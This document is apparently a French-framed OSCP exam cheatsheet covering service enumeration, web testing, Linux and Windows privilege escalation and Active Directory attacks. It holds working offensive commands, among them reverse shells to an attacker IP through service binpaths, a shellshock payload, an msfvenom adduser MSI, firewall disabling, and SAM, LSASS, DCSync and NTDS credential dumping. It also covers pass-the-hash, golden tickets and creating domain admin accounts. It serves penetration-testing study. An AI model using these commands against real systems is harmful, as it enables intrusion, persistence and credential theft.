---
title: "OSCP · Méthodologie OSCP"
description: "Organiser les vérifications et la collecte des résultats."
---

# OSCP · Méthodologie OSCP

Organiser les vérifications et la collecte des résultats.


## Services

Commandes, paramètres et exemples associés à cette technique.


### Scan initial

Vérifier les ports et les services de la cible autorisée.


### Méthodologie générale

Commandes, paramètres et exemples associés à cette technique.


```text
nc -v [ip] [port]
```


```text
telnet [ip] [port]
```


```text
creds
```


```text
site:github.com *Service version.release
```


```text
version + github + exploit search
```


```text
admin:admin
```


```text
admin:password
```


```text
root:admin
```


```text
root:password
```


```text
root:root
```


```text
[boxname]:admin
```


```text
[boxname]:password
```


```text
[appName]:[appName]
```


```text
admin:no pass
```


```text
root:no pass
```


```text
pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret
```


```text
creds
```


```text
sa
```


```text
office2john
```


```text
strings
```


```text
flare-floss
```


```bash
wget
```


```text
binwalk
```


```text
strings
```


```text
steghide
```


```text
wireshark
```


```text
exiftool
```


```text
pdfcrack
```


```text
exiftool
```


```text
zip2john
```


```text
7z2john
```


```text
dnSpy
```


```text
gpp decrypt
```


```text
vncpwd
```


```text
sqlite
```


```text
.conf
```


```text
.config
```


```text
.xml
```


### Specific Services Strategy

Commandes, paramètres et exemples associés à cette technique.


#### FTP (with Null Session)

Transférer ou récupérer des fichiers dans le laboratoire.


```text
exiftool
```


```text
strings
```


```text
binary
```


```text
.exe
```


```text
/var/ftp/anon/<directory-name-ifapplies>
```


```text
ftpusers
```


```text
ftp.conf
```


```text
proftpd.conf
```


```text
users.xml
```


```text
dotdotpwn
```


#### SMTP

Commandes, paramètres et exemples associés à cette technique.


```bash
nmap
```


```text
HYDRA SMTP ENUM
```


#### DNS

Interroger les enregistrements DNS et identifier les services associés.


```text
autorecon
```


```bash
nslookup
```


```bash
dig axfr
```


#### Kerberos

Examiner les objets, les droits et les services du domaine.


```text
kerbrute
```


#### POP3

Commandes, paramètres et exemples associés à cette technique.


```text
LIST
```


```text
retr <number>
```


#### RPC (with Null Session)

Commandes, paramètres et exemples associés à cette technique.


```text
enumdomusers
```


```text
enumprinters
```


#### SMB (with Null Session)

Examiner les objets, les droits et les services du domaine.


```text
smbcacls
```


#### SNMP

Commandes, paramètres et exemples associés à cette technique.


```bash
nmap
```


```text
snmpwalk
```


#### LDAP (with Null Session)

Examiner les objets, les droits et les services du domaine.


```text
ldapsearch
```


```text
pwd
```


```text
Pwd
```


```text
password
```


```text
pass
```


```text
Pass
```


```text
ldapdomaindump
```


#### Redis (with Null Session)

Commandes, paramètres et exemples associés à cette technique.


```text
/var/www/html/
```


```text
module.so
```


#### Rsync (with Null Session)

Commandes, paramètres et exemples associés à cette technique.


#### IRC

Commandes, paramètres et exemples associés à cette technique.


```text
hexchat
```


## Web

Examiner les entrées et les réponses de l'application web.


### Scan initial

Vérifier les ports et les services de la cible autorisée.


```text
Apache 2.4.49
```


### Analyse de vulnérabilités

Commandes, paramètres et exemples associés à cette technique.


```text
href
```


```text
exiftool
```


```text
html2markdown
```


```bash
curl -s http://[ip]/ | html2markdown
```


### Énumération des utilisateurs and Credential Gathering

Vérifier les comptes, les secrets et les mécanismes d'authentification.


```text
username:username
```


```text
username:password
```


```text
pass
```


```text
passwd
```


```text
pwd
```


```text
user
```


```text
usr
```


```text
secret
```


```text
cred
```


```text
credential
```


```text
auth
```


### CMS and Version Detection

Examiner les entrées et les réponses de l'application web.


```text
/etc/hosts
```


```text
phpinfo
```


```text
$_SERVER[CONTEXT_DOCUMENT_ROOT]: [C:/xampp/htdocs]
```


### Technology-Specific Checks

Commandes, paramètres et exemples associés à cette technique.


```text
changelog.txt
```


```text
endpoint_path
```


```text
kerbrute
```


```text
kerberoasting
```


```text
asproasting
```


```text
master.key
```


```text
root:
```


```text
root:password
```


```text
/manager
```


### Enumerate Upload Capabilities

Examiner les entrées et les réponses de l'application web.


### Application Logic and Security Analysis

Commandes, paramètres et exemples associés à cette technique.


```text
DoNotExist.php
```


```text
DoNotExist.html
```


```text
DoNotExist
```


### Directory and File Énumération

Commandes, paramètres et exemples associés à cette technique.


```text
/[boxName]
```


```text
/cgi-bin/
```


```bash
nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]
```


```text
/cgi-bin/
```


```text
wfuzz
```


```bash
ffuf
```


```text
forgot_pass.php
```


```text
GET /forgot_pass.php?email=%0aid
```


```text
robots.txt
```


```text
.svn
```


```text
.DS_STORE
```


### Parameter Testing and Injection SQL

Examiner les connexions, la configuration et les requêtes de la base de données.


### Authentication and Login Forms

Commandes, paramètres et exemples associés à cette technique.


```text
creds
```


```text
pip3 install defaultcreds-cheat-sheet
```


```text
cewl
```


```text
version:version
```


```text
boxname:boxname
```


```text
admin:version
```


```text
name:version
```


## Élévation de privilèges

Commandes, paramètres et exemples associés à cette technique.


### Linux

Examiner les permissions et la configuration de Linux.


#### Principles to Becoming Root

Commandes, paramètres et exemples associés à cette technique.


```bash
sudo -l
```


```text
cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash
```


#### Énumération générale

Commandes, paramètres et exemples associés à cette technique.


```text
ls -la
```


```text
root:root
```


```text
linpeas.sh
```


```text
PwnKit
```


```text
pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret
```


```text
/opt
```


```text
/srv
```


```text
find / -name "*.py"
```


#### Configurations Files

Commandes, paramètres et exemples associés à cette technique.


```text
/root/.ssh/id_rsa
```


```bash
(env || set) 2>/dev/null
echo $PATH
```


#### Services and Jobs

Commandes, paramètres et exemples associés à cette technique.


```text
PSPY
```


```text
mysql -uroot -pdasdasd
```


```text
Init
```


```text
init.d
```


```text
systemd
```


#### Credentials Search

Vérifier les comptes, les secrets et les mécanismes d'authentification.


```text
/etc/passwd
```


```text
/etc/shadow
```


```text
/etc/sudoers
```


```text
pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret
```


```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
locate password | more
```


```text
strings
```


```powershell
history
cat ~/.bash_history
```


```bash
history
cat ~/.bash_history
```


```bash
strings /dev/mem -n10 | grep -i PASS
```


```bash
cat ~/.ssh/id_rsa
ls ~/.ssh/*
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```


```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```


### Windows

Observer les permissions et la configuration de Windows.


#### General Énumération des utilisateurs

Commandes, paramètres et exemples associés à cette technique.


```powershell
whoami /all
net users %username%
net users
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```


```powershell
net localgroup
net localgroup Administrators
```


#### System Énumération

Commandes, paramètres et exemples associés à cette technique.


```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```


```powershell
wmic qfe
```


```powershell
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```


```powershell
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```


```powershell
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```


```bash
# List of exploits kernel https://github.com/SecWiki/windows-kernel-exploits
# to cross compile a program from Kali
$ i586-mingw32msvc-gcc -o adduser.exe useradd.c
```


#### Énumération réseau

Commandes, paramètres et exemples associés à cette technique.


```powershell
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```


```powershell
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```


```powershell
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```


```powershell
netstat -ano
```


```powershell
netstat -bona
```


```powershell
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```


```powershell
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
```


```powershell
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
```


```powershell
net share
powershell Find-DomainShare -ComputerDomain domain.local
```


```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```


#### Misconfigurations

Commandes, paramètres et exemples associés à cette technique.


```powershell
# using sc
sc qc <service_name>

# using accesschk.exe
accesschk.exe -ucqv <Service_Name>
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version

# using msf
exploit/windows/local/service_permissions
```


```powershell
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\" |findstr /i /v ""
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32\" |findstr /i /v "" #Not only auto services
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '*'} | select PathName,DisplayName,Name
```


```powershell
# if the group "Authenticated users" has SERVICE_ALL_ACCESS
# it can modify the binary path
# bind shell
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"

# reverse shell
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe <attacker-ip> 4444 -e cmd.exe"

# add user to local admin group
sc config <Service_Name> binpath= "net localgroup administrators username /add"

# example using SSDPRV
sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"

# then restart the service
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```


```powershell
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"

# do it by using sc
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```


```powershell
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"

# if Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl
# it can be leveraged to change the binary path inside the registry
reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```


```powershell
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```


```powershell
# using accesschk.exe
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\

# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*

# using icacls
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"

# using Powershell
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```


```powershell
# PATH DLL Hijacking
# having write permissions inside a folder present ON PATH could bring to DLL hijacking
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\ everyone authenticated users todos %username%" && echo. )
```


```powershell
# if both are enabled (set to 0x1), it's possible to execute
# any .msi as NT AUTHORITY\SYSTEM
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# check with msf
exploit/windows/local/always_install_elevated

# generate payload with msfvenom
# no uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
# using the msiexec the uac wont be prompted
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi

# install .msi
msiexec /quiet /qn /i C:\Users\Homer.NUCLEAR\Downloads\donuts.msi
```


```powershell
# using schtasks
schtasks /query /fo LIST /v
# filtering the output
schtasks /query /fo LIST /v | findstr /v "\Microsoft"

# using powershell
Get-ScheduledTask | ft TaskName,TaskPath,State
# filtering the output
Get-ScheduledTask | where {$_.TaskPath -nolike "\Microsoft*"} | ft TaskName,TaskPath,State
```


```powershell
wsl whoami
./ubuntum2004.exe config --default-user root
wsl whoami
wsl python -c 'put here your command'
```


#### Credential Access

Vérifier les comptes, les secrets et les mécanismes d'authentification.


```powershell
# Using powershell
powershell.exe Start-Process cmd.exe -Verb runAs
```


```powershell
# Check also with runas
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```


```powershell
dir /s /b /p *pass* == *cred* == *vnc* == *.config* == *conf* == *ini*
findstr /si /m password *.xml *.ini *.txt
```


```powershell
cmdkey /list
# if found
runas /savecred /user:WORKGROUP\Administrator "\\attacker-ip\SHARE\welcome.exe"
```


```powershell
reg query HKLM /f pass /t REG_SZ /s
reg query HKCU /f pass /t REG_SZ /s

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

# SNMP parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty credentials
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\

# VNC credentials
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password

## OpenSSH credentials
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```


```powershell
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattend*.xml
%WINDIR%\Panther\Unattend*.xml
```


```powershell
dir /s /b /p *access*.log* == *.log
```


```powershell
Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem -Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```


```powershell
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*vnc.ini, ultravnc.ini, \*vnc\*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
setupinfo
setupinfo.bak
key3.db #Firefox
key4.db #Firefox
places.sqlite #Firefox
"Login Data" #Chrome
Cookies #Chrome
Bookmarks #Chrome
History #Chrome
TypedURLsTime #IE
TypedURLs #IE
```


```powershell
# 1. Find AP SSID
netsh wlan show profile
# 2. Get cleartext password
netsh wlan show profile <SSID> key=clear
# OR
# Go hard and grab 'em all
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```


```powershell
c:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```


```powershell
# SessionGopher to grab PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP
# https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm\-arvanaghi -p s3cr3tP@ss
```


```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```


```powershell
Get-Item -path <filename> -Stream *
Get-Content -path <filename> -Stream <keyword>
```


```powershell
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```


```powershell
# From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```


```powershell
# Before Vista look inside
C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history
# After Vista look inside
C:\ProgramData\Microsoft\Group Policy\history
# Look for
Groups.xml
Services.xml
Scheduledtasks.xml
DataSources.xml
Printers.xml
Drives.xml

# Decrypt the passwords with
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```


```powershell
HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
HKCU\Software\Microsoft\Terminal Server Client\Servers\
```


```text
Remote desktop credential manager
```


```powershell
 %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```


```powershell
# Check if the retrieved sotfwares are vulnerable to DLL Sideloading
# https://github.com/enjoiz/Privesc
$result = Get-WmiObject -Namespace "root\\ccm\\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```


## Active Directory

Examiner les objets, les droits et les services du domaine.


### External Machine

Commandes, paramètres et exemples associés à cette technique.


#### Énumération de base

Commandes, paramètres et exemples associés à cette technique.


```powershell
hostname
ipconfig /all
```


```text
inactive/legacy
```


```powershell
net user
```


```powershell
net view \\[external_machine_ip]
```


#### Élévation de privilèges

Commandes, paramètres et exemples associés à cette technique.


```powershell
sc query state= all | findstr "SERVICE_NAME"
```


```powershell
# Look for them in C:\\ProgramData, C:\\Users\\All Users, and application-specific folders like C:\\Program Files.

dir /s /b C:\\Users\\Public\\*.config
```


```text
impacket-secretsdump
```


```bash
# Run in Windows
reg save HKLM\\SAM sam.save
reg save HKLM\\SYSTEM system.save

# Run in your Kali
impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
```


### Internal Machine

Commandes, paramètres et exemples associés à cette technique.


#### Lateral Movement

Commandes, paramètres et exemples associés à cette technique.


```bash
# Evil-WinRM
evil-winrm -i <target_ip> -u <username> -H 00000000000000000000000000000000:<NTLM_hash>

# PsExec
impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:<NTLM_hash>

# VMIExec
impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>@<target_ip>
```


```bash
# RDP
xfreerdp /size:1920x1080 /u:[user] /p:[password] /v:[host/ip] /drive:desktop,/home/[your_username]/Desktop

# Evil-WinRM
evil-winrm -u <username> -p <password> -i <target_ip>

# PsExec
impacket-psexec <username>:<password>@<target_ip>

# VMIExec
impacket-wmiexec <username>:<password>@<target_ip>
```


#### Élévation de privilèges

Commandes, paramètres et exemples associés à cette technique.


```text
cpassword
```


```text
SYSVOL
```


```powershell
# Check for cpassword in the SYSvol share to obtain cleartext passwords in XML files.
dir \\\\<domain>\\SYSVOL\\<domain>\\Policies\\ /s /b | findstr cpassword

# Look for Groups.xml files which might contain cleartext passwords.
smbclient //dc-ip/SYSVOL -U "domain\username"
```


```text
SharpHound
```


```text
BloodHound
```


```text
Shortest Path to Domain Admins
```


```powershell
.\\SharpHound.exe -c All -d <domain> -u <username> -p <password> -f AllData
```


```powershell
schtasks /query /fo LIST /v
```


```powershell
# Test for WinRM
crackmapexec winrm [domain_ip] -u [user_list].txt -p [found_passwords].txt --continue-on-success -d [subdomain.domain.com]
crackmapexec winrm [domain_ip] -u [user_list].txt -H [found_ntlm_hashes].txt --continue-on-success -d [subdomain.domain.com]

# Test for PsExec
crackmapexec smb [ip]  -u [user_list].txt -p [found_passwords].txt -d [subdomain.domain.com] --continue-on-success
crackmapexec smb [ip]  -u [user_list].txt -H [found_ntlm_hashes].txt -d [subdomain.domain.com] --continue-on-success

# Check if can find something else in the SMB
impacket-smbclient [user]:[password]@[ip]
impacket-smbclient [user]@[ip] -hashes 00000000000000000000000000000000:[valid_ntlm_hash]

# Test any other possible service or interesting thing you have found agains the subdomains
```


### Domain Controller

Examiner les objets, les droits et les services du domaine.


#### Targeted AD Attacks on DC

Commandes, paramètres et exemples associés à cette technique.


```text
mimikatz
```


```powershell
mimikatz # lsadump::dcsync /domain:<domain> /user:<target_user>
```


```text
NTDS.dit
```


```text
NTDS.dit
```


```text
C:\Windows\NTDS\
```


```text
NTDS.dit
```


```text
SYSTEM
```


```text
impacket-secretsdump
```


```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```


#### Golden Ticket Attack for Persistent Access

Commandes, paramètres et exemples associés à cette technique.


```powershell
kerberos::golden /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /user:Administrator
```


#### Credential Harvesting with LSASS

Vérifier les comptes, les secrets et les mécanismes d'authentification.


```text
LSASS
```


```text
Mimikatz
```


```powershell
mimikatz # sekurlsa::logonPasswords
```


### Post-Exploitation and Flag Collection

Commandes, paramètres et exemples associés à cette technique.


```text
C:\\Users\\Public
```


```text
C:\\Users\\[Administrator/any_user]\\Desktop
```


```powershell
hostname && whoami && ipconfig /all && type [local/proof].txt
```


```powershell
net user new_admin <password> /add /domain
net group "Domain Admins" new_admin /add /domain
```


### Additional Tips for Efficiency and Stealth

Commandes, paramètres et exemples associés à cette technique.


```powershell
Invoke-Obfuscation
```


```text
RDP
```


```text
WinRM
```


```text
SMBexec
```


```text
CrackMapExec
```


```text
Evil-WinRM
```


---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
